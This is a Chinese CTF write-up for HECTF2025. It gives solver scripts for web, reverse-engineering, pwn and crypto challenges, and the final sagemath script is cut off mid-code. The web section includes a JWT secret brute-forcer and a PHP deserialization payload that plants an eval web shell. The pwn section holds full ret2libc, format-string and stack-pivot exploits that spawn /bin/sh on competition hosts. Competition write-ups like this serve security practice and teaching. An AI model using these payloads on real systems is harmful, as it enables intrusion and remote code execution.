---
title: "HECTF2025 WP"
date: 2025-12-22 07:53:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "HECTF"
cnblogs_postid: "19380491"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/19380491"
---

最后排名第五
![assets/HECTF2025 WP/2b0733d4d75471d1268119424ece5160.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230805-806271548.png)
## Web
### 像素勇者和神秘宝藏
```
import itertools, hmac, hashlib, base64, json, requests, sys, time


HOST='http://47.100.66.83:31269'

WORD='hectf'

  

header={'alg':'HS256','typ':'JWT'}

payload={'user':'player','blessed':True,'sacred':True,'exp':1766239251}

  

def b64u(bs):

    return base64.urlsafe_b64encode(bs).decode().rstrip('=')

  

hdr = b64u(json.dumps(header,separators=(',',':')).encode())

plb = b64u(json.dumps(payload,separators=(',',':')).encode())

msg = f"{hdr}.{plb}"

  

candidates = []

for bits in itertools.product(*[(c.lower(),c.upper()) for c in WORD]):

    candidates.append(''.join(bits))

  

print(f"Trying {len(candidates)} case permutations for '{WORD}'...")

  

session = requests.Session()

for idx,secret in enumerate(candidates,1):

    sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()

    tok = f"{msg}.{b64u(sig)}"

    cookies = {'token':tok, 'role':'vip'}

    try:

        r = session.post(HOST+'/enter', data={'door':'C','courage':'0'}, cookies=cookies, timeout=6)

        text = r.text

        print(f"[{idx}/{len(candidates)}] try={secret} status={r.status_code} len={len(text)}")

        short = text[:500].replace('\n',' ')

        print(short)

        if 'flag' in text.lower() or '宝藏' in text or 'FLAG' in text:

            print('\n=== POSSIBLE FLAG RESPONSE ===')

            print(text)

            sys.exit(0)

    except Exception as e:

        print(f"[{idx}/{len(candidates)}] try={secret} ERROR {e}")

    time.sleep(0.15)

  

print('Finished permutations, no flag found.')
```
![assets/HECTF2025 WP/屏幕截图 2025-12-20 211750.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230821-652185438.png)
### 红宝石的恶作剧
![assets/HECTF2025 WP/file-20251221184041898.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075231528-1442906494.png)
### 老爷爷的金块
翻，第一张图片就是flag
![assets/HECTF2025 WP/bk_flag.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230583-1106830863.png)
### PHPGift
提示
![assets/HECTF2025 WP/file-20251221183007072.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230608-955982855.png)
爆破得到是ser.php
写payload马，然后访问shell.php
```
<?php

class Logger {

    private $logFile;

    public function __construct($logFile = 'app.log') {

        $this->logFile = $logFile;

    }

}

  

class User {

    public $data;

    public $params;

}

  

class FileHandler {

    private $fileHandle;

    private $fileName;

    public function __construct($fileName) {

        $this->fileName = $fileName;

    }

}

  

$l = new Logger('dummy');

  

$u1 = new User();

$u1->data = [$l, 'setLogFile'];

$u1->params = 'php://filter/write=convert.base64-decode/resource=shell.php';

  

$f1 = new FileHandler($u1);

  

$u2 = new User();

$u2->data = [$l, '__invoke'];

$u2->params = base64_encode('<?php @eval($_POST[1]); ?>');

  

$f2 = new FileHandler($u2);3

  

$payload = [$f1, $f2];

echo base64_encode(serialize($payload));

?>
```
随后找一下flag
![assets/HECTF2025 WP/file-20251221183618460.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075229988-474353902.png)

## Reverse
### selfhash
```
import struct

def u32(x): return x & 0xffffffff

delta = 0x9E3589B7
k0, k1, k2, k3 = 2, 2, 3, 4

def G(v1, s):
    return u32((u32(v1 << 3) + k0) ^ u32(v1 + s) ^ u32((v1 >> 5) + k1))

def F(v0, s):
    return u32((u32(v0 << 6) + k2) ^ u32(v0 + s) ^ u32((v0 >> 5) + k3))

def dec_block(v0, v1):
    s = u32(delta * 32)
    for _ in range(32):
        v1 = u32(v1 - F(v0, s))
        v0 = u32(v0 - G(v1, s))
        s  = u32(s - delta)
    return v0, v1

v12 = [-625000435, 1921557744, 822383554, 1997933505,
       765037762, 1622375005, -33651681, 971056791]
ct = [u32(x) for x in v12]

pt_words = []
for i in range(0, 8, 2):
    v0, v1 = dec_block(ct[i], ct[i+1])
    pt_words += [v0, v1]

pt = b"".join(struct.pack("<I", w) for w in pt_words)
print(pt.decode())
```
### easyree
```
import struct

  

def u32(x): return x & 0xffffffff

  

delta = 0x9E3589B7

k0, k1, k2, k3 = 2, 2, 3, 4

  

def G(v1, s):

    return u32((u32(v1 << 3) + k0) ^ u32(v1 + s) ^ u32((v1 >> 5) + k1))

  

def F(v0, s):

    return u32((u32(v0 << 6) + k2) ^ u32(v0 + s) ^ u32((v0 >> 5) + k3))

  

def dec_block(v0, v1):

    s = u32(delta * 32)

    for _ in range(32):

        v1 = u32(v1 - F(v0, s))

        v0 = u32(v0 - G(v1, s))

        s  = u32(s - delta)

    return v0, v1

  

v12 = [-625000435, 1921557744, 822383554, 1997933505,

       765037762, 1622375005, -33651681, 971056791]

ct = [u32(x) for x in v12]

  

pt_words = []

for i in range(0, 8, 2):

    v0, v1 = dec_block(ct[i], ct[i+1])

    pt_words += [v0, v1]

  

pt = b"".join(struct.pack("<I", w) for w in pt_words)

print(pt.decode())
```
### ezapp
```
import struct

def u32(x): return x & 0xffffffff
def rotl32(x, r): return u32((x << r) | (x >> (32 - r)))

# 目标密文（来自 rodata f8b0/f890，拼成 28 字节）
cipher = bytes.fromhex(
    "62 93 7a a2 c0 df 91 80 b1 4b ab fe 8b a0 bc d6"
    "54 29 d5 6a db 35 c6 fa de 19 d1 0b".replace(" ", "")
)

# rcx 指向的 16 字节常量（0x10f80）
K_bytes = bytes.fromhex("10 32 54 76 98 ba dc fe 01 23 45 67 89 ab cd ef".replace(" ", ""))
K = list(struct.unpack("<4I", K_bytes))

# key 派生：rotl3 + shuffle(0x39) + (K ^ 0xA5A5A5A5)
A5 = 0xA5A5A5A5
K_xor = [u32(x ^ A5) for x in K]
rot = [rotl32(x, 3) for x in K]
rot_shuf = [rot[1], rot[2], rot[3], rot[0]]   # pshufd imm=0x39
key = [u32(rot_shuf[i] + K_xor[i]) for i in range(4)]

delta = 0xE46C45A4

def mx(sum_, y, z, p, e, k):
    return u32(
        (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4)))
        ^ ((sum_ ^ y) + (k[(p & 3) ^ e] ^ z))
    )

def xxtea_decrypt_words(v, k):
    n = len(v)
    rounds = 7 + (52 // n)
    sum_ = u32(delta * rounds)
    y = v[0]
    for _ in range(rounds):
        e = (sum_ >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            v[p] = u32(v[p] - mx(sum_, y, z, p, e, k))
            y = v[p]
        z = v[n - 1]
        v[0] = u32(v[0] - mx(sum_, y, z, 0, e, k))
        y = v[0]
        sum_ = u32(sum_ - delta)
    return v

def xxtea_encrypt_words(v, k):
    n = len(v)
    rounds = 7 + (52 // n)
    sum_ = 0
    z = v[n - 1]
    for _ in range(rounds):
        sum_ = u32(sum_ + delta)
        e = (sum_ >> 2) & 3
        for p in range(n - 1):
            y = v[p + 1]
            v[p] = u32(v[p] + mx(sum_, y, z, p, e, k))
            z = v[p]
        y = v[0]
        v[n - 1] = u32(v[n - 1] + mx(sum_, y, z, n - 1, e, k))
        z = v[n - 1]
    return v

# 1) 解密得到 XOR 后的明文（28字节，末尾可能有 padding 0）
cw = list(struct.unpack("<7I", cipher))
pw = xxtea_decrypt_words(cw, key)
plain_padded = struct.pack("<7I", *pw)

# 2) 推断真实长度：这里末尾 1 字节是 padding 0，所以长度=27
xored = plain_padded[:27]

# 3) 反 XOR 得到原输入(flag)
flag = bytes(b ^ ((i - 0x5b) & 0xff) for i, b in enumerate(xored))
print("FLAG =", flag.decode())

# 4) 正向校验：把 flag 再加密回去应当==cipher
tmp = bytearray(flag)
for i in range(len(tmp)):
    tmp[i] ^= (i - 0x5b) & 0xff
pad = tmp + b"\x00"  # pad 到 28
vw = list(struct.unpack("<7I", pad))
enc = struct.pack("<7I", *xxtea_encrypt_words(vw, key))
print("verify =", enc.hex() == cipher.hex())
```
### cython
直接运行即可
![assets/HECTF2025 WP/file-20251221163620674.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230092-773119638.png)
### babyre
对标志位进行修复
![assets/HECTF2025 WP/file-20251221151041700.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075231369-1280065627.png)
保存后发现是pyexe打包程序，解开
pycdc进行pyc逆向
![assets/HECTF2025 WP/file-20251221151229219.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230180-973647146.png)
然后解密
```
# Fixed-logic decrypt script: enforce masking and proper swaps

CIPHERTEXT = bytes.fromhex('b956c3fbf3d57b2a800834ebbf9deabb814b8a2169dcd0fd18ffd3b003')

KEY = b'L00K1t'

  

def rc4_crypt_fixed(data=None, key=None):

    sbox = [(i * 3 + 7) % 256 for i in range(256)]

    j = 0

    key_len = len(key)

    for i in range(256):

        k = key[i % key_len]

        j = (j + sbox[i] + (k ^ 90) + (i ^ j)) & 255

        a = (i + 1) & 255

        b = (j - 1) & 255

        tmp = sbox[a]

        sbox[a] = sbox[b]

        sbox[b] = tmp

    i = 0

    j = 0

    out = bytearray()

    for byte in data:

        i = (i + 1) & 255

        j = (j + (sbox[i] ^ 90) + (i ^ j)) & 255

        a = (i + 1) & 255

        b = (j - 1) & 255

        tmp = sbox[a]

        sbox[a] = sbox[b]

        sbox[b] = tmp

        t = (sbox[a] + sbox[b]) & 255

        out.append(byte ^ sbox[t])

    return bytes(out)

  

if __name__ == '__main__':

    keystream = rc4_crypt_fixed(b'\x00' * len(CIPHERTEXT), KEY)

    plaintext = bytes(c ^ k for c, k in zip(CIPHERTEXT, keystream))

    try:

        print(plaintext.decode('utf-8'))

    except Exception:

        print(repr(plaintext))

    print(plaintext.hex())
```
![assets/HECTF2025 WP/file-20251221151254833.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075232330-1591278363.png)
### traceme
```
#!/usr/bin/env python3

data_bytes = [

    72,86,208,71,100,104,173,94,51,102,17,38,134,64,200,117,

    73,37,152,87,83,124,13,33,99,73,13,102,148,42,197,110

]

  

def ror(b, n):

    n = n % 8

    if n == 0:

        return b & 0xFF

    return ((b >> n) | ((b << (8 - n)) & 0xFF)) & 0xFF

  

def rol(b, n):

    n = n % 8

    if n == 0:

        return b & 0xFF

    return (( (b << n) & 0xFF) | (b >> (8 - n))) & 0xFF

  

orig = []

for i in range(32):

    db = data_bytes[i]

    if i % 2 == 1:

        orig.append(db ^ 0x13)

    else:

        n = i % 8

        if n == 0:

            n = 8

        # move() implements rotate-right by n, so inverse is rotate-left

        orig.append(rol(db, n))

  

flag_bytes = bytes(orig)

print('hex:', flag_bytes.hex())

try:

    print('ascii:', flag_bytes.decode('utf-8'))

except Exception:

    print('ascii (latin-1):', flag_bytes.decode('latin-1'))

  

if __name__ == '__main__':

    pass
```
## Pwn
### nc一下~
![assets/HECTF2025 WP/file-20251221185222034.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075231121-1528487094.png)
然后纯猜
![assets/HECTF2025 WP/file-20251221185300771.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230662-271177618.png)
### Class_Schedule_Management_System
uaf模板题
```
from pwn import *
p=remote('8.153.93.57',30990)
#p=process('./pwn')
elf=ELF('./pwn')
#gdb.attach(p)
#pause()
context(log_level='debug')
p.sendlineafter(b':',str(2))
p.recvuntil(':')
p.sendline(b'shopadmin123')
p.recvuntil('amount:')
p.sendline(str(-1))
p.recvuntil('Enter product name:')
p.sendline(str(-1))
p.recvuntil('Enter product price:')
p.sendline(str(-1))
p.recvuntil('description:')
pop_rdi=0x401240
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main_addr=0x401266
payload=b'a'*0x58+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc=ELF('./libc.so.6')
libc_base = puts_addr-0x87be0
log.success('libc_addr:'+hex(libc_base))
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + 0x00000000001cb42f 
p.recvuntil('Enter product name:')
p.sendline(str(-1))
p.recvuntil('Enter product price:')
p.sendline(str(-1))
p.recvuntil('description:')
payload = 0x58 * b'a' +p64(pop_rdi+1)+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
```
### fmt
格式化字符串+ret2libc
```
from pwn import *

from LibcSearcher import *

  

# Set the architecture and binary

context.binary = './xs'

context.log_level = 'debug'

  

# Remote connection details

host = '47.100.66.83'

port = 32498

  

if args.REMOTE:

    p = remote(host, port)

else:

    p = process('./xs')

  

elf = ELF('./xs')

  

# --- Stage 1: Leak Canary ---

# The format() function has a format string vulnerability.

# Canary is at offset 39.

  

p.recvuntil(b"Try to write some words:\n")

payload = b'%39$p'

p.sendline(payload)

  

# The first line received is the output of printf (the leak)

leak_data = p.recvline().strip().decode()

print(f"Leak Data: {leak_data}")

  

canary = int(leak_data, 16)

print(f"[+] Canary: {hex(canary)}")

  

# --- Stage 2: Leak Libc Address via ROP ---

# We will leak puts and read to identify libc more accurately.

  

p.recvuntil(b"What's your name?\n")

  

pop_rdi = 0x4011f3

ret = 0x40101a

puts_plt = 0x401030

puts_got = 0x404000

read_got = 0x404020

main_addr = 0x4012dd

  

# Payload to leak puts

payload = b'A' * 104

payload += p64(canary)

payload += b'B' * 8

payload += p64(pop_rdi)

payload += p64(puts_got)

payload += p64(puts_plt)

payload += p64(main_addr)

  

print("Sending ROP payload to leak puts...")

p.sendline(payload)

  

# Receive puts leak

try:

    leak = p.recvline()

    if not leak or leak == b'\n': leak = p.recvline()

    puts_leak = u64(leak.strip().ljust(8, b'\x00'))

    print(f"[+] Puts Leak: {hex(puts_leak)}")

except Exception as e:

    print(f"Error receiving puts leak: {e}")

    exit(1)

  

# --- Stage 3: Leak read Address ---

# Back at main, pass format()

p.recvuntil(b"Try to write some words:\n")

p.sendline(b'pass')

  

p.recvuntil(b"What's your name?\n")

  

# Payload to leak read

payload = b'A' * 104

payload += p64(canary)

payload += b'B' * 8

payload += p64(pop_rdi)

payload += p64(read_got)

payload += p64(puts_plt)

payload += p64(main_addr)

  

print("Sending ROP payload to leak read...")

p.sendline(payload)

  

# Receive read leak

try:

    leak = p.recvline()

    if not leak or leak == b'\n': leak = p.recvline()

    read_leak = u64(leak.strip().ljust(8, b'\x00'))

    print(f"[+] Read Leak: {hex(read_leak)}")

except Exception as e:

    print(f"Error receiving read leak: {e}")

    exit(1)

  

# --- Stage 4: Identify Libc and Exploit ---

print("Searching for libc...")

try:

    libc = LibcSearcher('puts', puts_leak)

    libc.add_condition('read', read_leak)

    libc_base = puts_leak - libc.dump('puts')

    system_addr = libc_base + libc.dump('system')

    bin_sh = libc_base + libc.dump('str_bin_sh')

    print(f"[+] Libc Base: {hex(libc_base)}")

except Exception as e:

    print(f"LibcSearcher failed: {e}")

    print("Please manually check the leaks on https://libc.blukat.me/")

    exit(1)

  

# --- Stage 5: Final Exploit ---

# Back at main, pass format()

p.recvuntil(b"Try to write some words:\n")

p.sendline(b'pass')

  

p.recvuntil(b"What's your name?\n")

  

payload = b'A' * 104

payload += p64(canary)

payload += b'B' * 8

payload += p64(ret) # Align stack

payload += p64(pop_rdi)

payload += p64(bin_sh)

payload += p64(system_addr)

  

p.sendline(payload)

p.interactive()

  

libc = LibcSearcher('puts', puts_leak)

libc_base = puts_leak - libc.dump('puts')

system_addr = libc_base + libc.dump('system')

bin_sh = libc_base + libc.dump('str_bin_sh')

  

print(f"[+] Libc Base: {hex(libc_base)}")

print(f"[+] System: {hex(system_addr)}")

  

# --- Stage 4: Final Exploit ---

# We are back at main.

# Handle format() again (we don't need to leak, just pass it)

p.recvuntil(b"Try to write some words:\n")

p.sendline(b'pass')

  

# Handle libc() again for the final shell

p.recvuntil(b"What's your name?\n")

  

payload = b'A' * 104

payload += p64(canary)

payload += b'B' * 8

  

# ROP to system('/bin/sh')

payload += p64(ret) # Align stack

payload += p64(pop_rdi)

payload += p64(bin_sh)

payload += p64(system_addr)

  

p.sendline(payload)

p.interactive()
```
### game
栈迁移+ret2libc
1. **漏洞利用**：利用 `input_username` 覆盖随机数种子，预测随机数赢得游戏并泄露地址。
2. **ROP 构造**：利用 `init_map` 将 ROP 链写入全局变量 `map`。
3. **栈枢轴**：利用 `input_username1` 溢出，通过 [leave; ret](vscode-file://vscode-app/d:/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) 将栈迁移到 `map`。
4. **执行 Shell**：构造 `execve("/bin/sh", 0, 0)` 调用链。由于 `system` 调用失败（可能是环境原因），改用 `execve` 成功。
    - `pop rdi` 和 `pop rsi` gadget 来自 libc。
    - `pop rdx` gadget 来自 [game](vscode-file://vscode-app/d:/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) 程序本身。

exp
```
from pwn import *

from time import sleep

  

context.log_level = 'debug'

context.arch = 'amd64'

  

# remote address

host = '47.100.66.83'

port = 32584

  

# Load provided binaries to extract exact offsets

elf = ELF('./game')

libc = ELF('./libc.so.6')

  

# libc offsets (extracted from provided libc)

printf_offset = libc.symbols.get('printf')

system_offset = libc.symbols.get('system')

bin_sh_offset = next(libc.search(b'/bin/sh'))

  

# try to find gadgets in libc; fall back to None if not found

pop_rdi_offset = None

ret_offset = None

try:

    rop_libc = ROP(libc)

    g = rop_libc.find_gadget(['pop rdi', 'ret'])

    if g:

        pop_rdi_offset = g[0]

except Exception:

    pop_rdi_offset = None

try:

    g2 = ROP(libc).find_gadget(['ret'])

    if g2:

        ret_offset = g2[0]

except Exception:

    ret_offset = None

  

# binary offsets (from provided game)

map_offset = elf.symbols.get('map')

leave_ret_offset = None

try:

    g3 = ROP(elf).find_gadget(['leave', 'ret'])

    if g3:

        leave_ret_offset = g3[0]

except Exception:

    leave_ret_offset = None

  

# Test mode: if True, build ROP to call puts(binary_string) to verify pivot works

TEST_PUTS = True

  

def solve():

    # io = process('./game')

    io = remote(host, port)

  

    # 1. Go to guess_game

    io.sendlineafter(b'option: ', b'1')

  

    # 2. Overwrite seed in input_username

    # buf is at rbp-30h (48 bytes), v2 is at rbp-8h (40 bytes from buf)

    payload = b'a' * 40 + p32(0)

    io.sendafter(b'Enter your username (max 32 chars): ', payload)

  

    # 3. Guess the 5 numbers (srand(0))

    # Numbers: [3, 6, 7, 5, 3]

    nums = [3, 6, 7, 5, 3]

    for n in nums:

        io.sendlineafter(b'Guess the number (0-9): ', str(n).encode())

  

    # 4. Get leaks

    io.recvuntil(b'[GIFT] printf address: ')

    printf_addr = int(io.recvline().strip(), 16)

    io.recvuntil(b'[GIFT] map address: ')

    map_addr = int(io.recvline().strip(), 16)

  

    libc_base = printf_addr - printf_offset

    bin_base = map_addr - map_offset

  

    log.success(f'Libc base: {hex(libc_base)}')

    log.success(f'Binary base: {hex(bin_base)}')

  

    system_addr = libc_base + system_offset

    bin_sh_addr = libc_base + bin_sh_offset

    pop_rdi = libc_base + pop_rdi_offset

    ret = libc_base + ret_offset

    leave_ret = bin_base + leave_ret_offset

  

    # Debug: print resolved gadget addresses

    log.info(f'printf @ {hex(printf_addr)}')

    log.info(f'pop_rdi -> {hex(pop_rdi) if pop_rdi else None}')

    log.info(f'ret -> {hex(ret) if ret else None}')

    log.info(f'system -> {hex(system_addr)}')

    log.info(f'/bin/sh -> {hex(bin_sh_addr)}')

    log.info(f'map_addr -> {hex(map_addr)}')

    log.info(f'leave_ret -> {hex(leave_ret) if leave_ret else None}')

  

    # 5. Go to game_loop

    io.sendlineafter(b'option: ', b'2')

  

    # 6. init_map: send ROP chain to map

    # Wait for the game loop strings

    io.recvuntil(b'Collect all dots to win!\n')

    # Add a small delay to ensure init_map's read is active

    sleep(0.2)

  

    # map + 0: dummy rbp

    # map + 8: ret (align)

    # map + 16: pop rdi

    # map + 24: /bin/sh

    # map + 32: pop rsi

    # map + 40: 0

    # map + 48: pop rdx

    # map + 56: 0

    # map + 64: execve

    # Find gadgets for execve

    try:

        pop_rsi_offset = rop_libc.find_gadget(['pop rsi', 'ret'])[0]

    except:

        # fallback to pop rsi; pop r15; ret

        try:

            pop_rsi_offset = rop_libc.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

        except:

            log.error("Cannot find pop rsi gadget")

            return

  

    # pop rdx is in game binary

    pop_rdx_offset_game = 0x12b0

  

    execve_offset = libc.symbols.get('execve')

    execve_addr = libc_base + execve_offset

    pop_rsi = libc_base + pop_rsi_offset

    pop_rdx = bin_base + pop_rdx_offset_game

  

    # map + 0: dummy rbp

    # map + 8: ret (align)

    # map + 16: pop rdi

    # map + 24: /bin/sh

    # map + 32: pop rsi

    # map + 40: 0

    # map + 48: pop rdx

    # map + 56: 0

    # map + 64: execve

    # Gadgets

    # pop rdi from libc

    # pop rsi from libc (0x110a7d)

    # pop rdx from game (0x12b0)

    pop_rsi_offset = 0x110a7d

    pop_rdx_offset_game = 0x12b0

    execve_offset = libc.symbols.get('execve')

    execve_addr = libc_base + execve_offset

    pop_rsi = libc_base + pop_rsi_offset

    pop_rdx = bin_base + pop_rdx_offset_game

    # Construct chain

    chain = []

    chain.append(p64(0)) # dummy rbp

    chain.append(p64(ret)) # align

    chain.append(p64(pop_rdi))

    chain.append(p64(bin_sh_addr))

    chain.append(p64(pop_rsi))

    chain.append(p64(0))

    chain.append(p64(pop_rdx))

    chain.append(p64(0))

    chain.append(p64(execve_addr))

    rop_chain = b''.join(chain)

    io.send(rop_chain.ljust(0x70, b'\x00'))

  

    # 7. input_username1: stack pivot to map

    # buf is at rbp-20h (32 bytes)

    # payload: 32 bytes padding + map_addr (new rbp) + leave_ret

    payload = b'b' * 32 + p64(map_addr) + p64(leave_ret)

    io.sendafter(b'Enter your username (max 32 chars): ', payload)

  

    io.interactive()

  

if __name__ == '__main__':

    solve()
```
![assets/HECTF2025 WP/file-20251221162333339.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230617-88370316.png)
### shop
一个简单的ret2libc
exp
```
from pwn import *

import sys

import time

  

# Config

BINARY = './shop'

LIBC = './libc.so.6'

HOST = '47.100.66.83'

PORT = 31932

  

context(os='linux', arch='amd64', log_level='debug')

  
  

def find_leak(data):

    if not data:

        return 0

    idx = data.find(b'\x7f')

    if idx != -1:

        start = max(0, idx - 5)

        leak6 = data[start:idx + 1]

        return u64(leak6.ljust(8, b"\x00"))

    return 0

  
  

def exploit(target=(HOST, PORT)):

    elf = ELF(BINARY)

    libc = ELF(LIBC)

  

    r = remote(target[0], target[1])

  

    # Navigate menu to vuln

    r.recvuntil(b'Enter choice:')

    r.sendline(b'2')

    r.recvuntil(b'Enter admin password:')

    r.sendline(b'shopadmin123')

  

    r.recvuntil(b'Enter total purchase amount:')

    r.sendline(b'-1')

    r.recvuntil(b'Enter product name:')

    r.sendline(b'A')

    r.recvuntil(b'Enter product price:')

    r.sendline(b'1')

    r.recvuntil(b'Enter purchase description:')

  

    # Build stage1: leak puts from GOT

    rop = ROP(elf)

    try:

        pop_rdi = int(rop.find_gadget(['pop rdi', 'ret'])[0])

    except Exception:

        pop_rdi = 0x4012b3

  

    puts_got = elf.got['puts']

    puts_plt = elf.plt['puts']

    main = elf.symbols['main']

    offset = 0x58

    payload1 = flat({offset: [pop_rdi, puts_got, puts_plt, main]})

  

    r.sendline(payload1)

  

    # collect leak

    leaked = b''

    try:

        leaked += r.recv(timeout=1)

    except Exception:

        pass

    try:

        leaked += r.recvuntil(b'Enter choice:', timeout=3)

    except Exception:

        try:

            leaked += r.recv(timeout=2)

        except Exception:

            pass

  

    log.info('raw leak data: %r' % leaked)

    puts_leak = find_leak(leaked)

    if puts_leak == 0:

        log.error('failed to leak puts')

        return

  

    log.success('leaked puts: %#x' % puts_leak)

  

    libc_base = puts_leak - libc.symbols['puts']

    system_addr = libc_base + libc.symbols['system']

    binsh = libc_base + next(libc.search(b"/bin/sh"))

    log.success('libc base: %#x system: %#x binsh: %#x' % (libc_base, system_addr, binsh))

  

    # stage2: ret2libc -> system('/bin/sh')

    try:

        pop_rdi = int(rop.find_gadget(['pop rdi', 'ret'])[0])

    except Exception:

        pop_rdi = 0x4012b3

    try:

        ret_g = int(rop.find_gadget(['ret'])[0])

    except Exception:

        ret_g = None

  

    rop2 = []

    if ret_g:

        rop2.append(ret_g)

    rop2 += [pop_rdi, binsh, system_addr]

    payload2 = flat({offset: rop2})

  

    # navigate again to vuln

    r.sendline(b'2')

    r.recvuntil(b'Enter admin password:')

    r.sendline(b'shopadmin123')

    r.recvuntil(b'Enter total purchase amount:')

    r.sendline(b'-1')

    r.recvuntil(b'Enter product name:')

    r.sendline(b'B')

    r.recvuntil(b'Enter product price:')

    r.sendline(b'1')

    r.recvuntil(b'Enter purchase description:')

  

    r.sendline(payload2)

    time.sleep(0.5)

    r.interactive()

  
  

if __name__ == '__main__':

    if len(sys.argv) == 3:

        exploit((sys.argv[1], int(sys.argv[2])))

    else:

        exploit()
```
### easy_pwn
简单栈溢出
```
from pwn import *
io=remote("47.100.66.83",31845)
io.recvuntil(b'HECTF!')
io.sendline(b'GDBSE')
payload=b'a'*0x38+p64(0x4011de)
io.sendline(payload)
io.interactive()
```
## Crypto
### ez_rsa
```
# Solver for ez_rsa scheme using continued fraction trick

# Finds q1, q2 from n1/n2 ratio, then recovers p1, p2 and decrypts

  

c1 = 53794102520259772962649045858576221465470825190832934218429615676578733090040151233709954118823187509134204197900878909625807999086331747342514637503295791730180510192956834523005990404866445713234424086559831376810175311081520383413318056594422752551500083114685166907745013622324855991979140245907218436391231529893571051805289332021969063468163881523935479367416921655014639791920

c2 = 9052082423365224257952169727471511116343636754632940194264502704697852932532482639724493657103678314302886687710898937205955106008040357863303819909329575056725102501066300771840780970209680697874184954776520388520912958918609760491518738565339512830340891355495761329325539914537183981946727807621066415407718405281155516000986687797150964327740274908804298880671020463280815846412

n1 = 98883753407297608957629424865714335053996022388238735569824164507623692527853962975392303234473035916456899244665285221847772940522588864849967816934720547920870269288918027227609323674530533210183199265184870283022950180411036770713693931074212919932370249829101629879564811122352724775705189146681235092749483273337940646214392591186563201709371435197518622209250725811137856196641

n2 = 52847447490004248309003888295738534958949920800650087542364666545481208701251931880585683578162296213389552561184640931603466477091024928446523302557870614402843171797849560571453293858739610330175253863157533028976216594152329043556996573601155253747817112184987205405092446153491574442703185973485274472403444657880456022918181503181300476227341269990508005711171556056777832920469

  

e = 65537

  

def is_square(n: int) -> bool:

    if n < 0:

        return False

    from math import isqrt

    s = isqrt(n)

    return s * s == n

  

from math import isqrt

  

def continued_fraction(num: int, den: int):

    cf = []

    while den:

        a = num // den

        cf.append(a)

        num, den = den, num - a * den

    return cf

  
  

def convergents_from_cf(cf):

    h1, h2 = 1, cf[0]

    k1, k2 = 0, 1

    yield (cf[0], 1)

    for a in cf[1:]:

        h = a * h2 + h1

        k = a * k2 + k1

        yield (h, k)

        h1, h2 = h2, h

        k1, k2 = k2, k

  
  

def find_qs(n1: int, n2: int):

    cf = continued_fraction(n1, n2)

    for num, den in convergents_from_cf(cf):

        if num == 0 or den == 0:

            continue

        if n1 % num == 0 and n2 % den == 0:

            x1 = n1 // num

            x2 = n2 // den

            if is_square(x1) and is_square(x2):

                p1 = isqrt(x1)

                p2 = isqrt(x2)

                q1 = num

                q2 = den

                return p1, q1, p2, q2

    return None

  
  

def inv_mod(a: int, m: int) -> int:

    # Extended Euclidean Algorithm

    t, new_t = 0, 1

    r, new_r = m, a

    while new_r != 0:

        q = r // new_r

        t, new_t = new_t, t - q * new_t

        r, new_r = new_r, r - q * new_r

    if r > 1:

        raise ValueError("a is not invertible")

    if t < 0:

        t += m

    return t

  
  

def long_to_bytes(n: int) -> bytes:

    if n == 0:

        return b"\x00"

    length = (n.bit_length() + 7) // 8

    return n.to_bytes(length, 'big')

  
  

def main():

    res = find_qs(n1, n2)

    if not res:

        print("Failed to recover factors via CF")

        return

    p1, q1, p2, q2 = res

    # Compute phis

    phi1 = p1 * (p1 - 1) * (q1 - 1)

    phi2 = p2 * (p2 - 1) * (q2 - 1)

    d1 = inv_mod(e, phi1)

    d2 = inv_mod(e, phi2)

    m1 = pow(c1, d1, n1)

    m2 = pow(c2, d2, n2)

    b1 = long_to_bytes(m1)

    b2 = long_to_bytes(m2)

    flag = b1 + b2

    try:

        print(flag.decode())

    except Exception:

        print(flag)

  

if __name__ == "__main__":

    main()
```
### dq
sagemath
```
import sys

dq_low = 335584540380442406421659167342342638249
qinvp = 292380991609815479569318671567034568158741535336887645461482569000277924434025200418747744584399819139565007718147991186087121959333784855885409627807059
c = 79629543091521335572424036010295736463371865643788850996124745633140088693314474944546097858072542270744120204079572911048563286953176355620930088558852130198643488701338502773300967950160034234386587652495960085056607599181184904621488863558676003785173655724057777780825432810217070169799364372132482673582
n = 86062666525788610805322579359521230247485941052919698110209821574415795978267400179921030947943594715362554402337569699962889595727915713729727353653488455319575472816541725860439018405245986660080770381711691707583311039956616813650240564767989150096091515884074613899035773693670199866584129217246504406289
e = 65537

d0 = dq_low
A = e * 2^128

found = False
for t in range(1, e):
    rhs = (1 - e * d0) % t
    g = gcd(A, t)
    if rhs % g != 0:
        continue
    A1 = A // g
    t1 = t // g
    rhs1 = rhs // g
    try:
        inv = inverse_mod(A1, t1)
    except:
        continue
    x0_mod = (rhs1 * inv) % t1
    for s in range(g):
        x0 = x0_mod + t1 * s
        M = e * d0 + A * x0 - 1
        if M % t != 0:
            continue
        q0 = M // t + 1
        R.<k> = PolynomialRing(Zmod(n))
        a = qinvp * A^2
        b = 2 * qinvp * q0 * A - A
        c_ = qinvp * q0^2 - q0  # 避免与密文 c 重名
